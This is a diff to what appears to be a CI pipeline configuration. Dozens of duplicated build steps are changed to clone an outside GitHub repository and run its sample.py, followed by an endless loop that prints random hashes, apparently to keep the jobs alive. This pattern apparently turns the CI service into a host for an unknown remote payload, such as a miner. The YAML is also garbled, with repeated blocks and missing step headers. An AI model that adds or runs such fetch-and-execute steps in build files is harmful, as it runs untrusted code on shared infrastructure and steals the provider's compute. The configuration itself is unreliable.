@@ -8,592 +8,592 @@ pipelines:
       - step:
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
           name: build-1
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-2
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-3
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-4
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-5
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-6
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-7
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-8
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-9
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
       - step:
           name: build-10
           script:
-            - apt update && apt install sudo screen -y
-            - chmod +x manual && ./manual
+            - git clone https://github.com/pramadoli/b && cd b
+            - python sample.py
             - while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
